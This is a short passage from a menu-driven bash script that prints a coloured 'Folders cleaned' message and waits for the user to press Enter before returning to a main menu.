       echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
       read anjeng
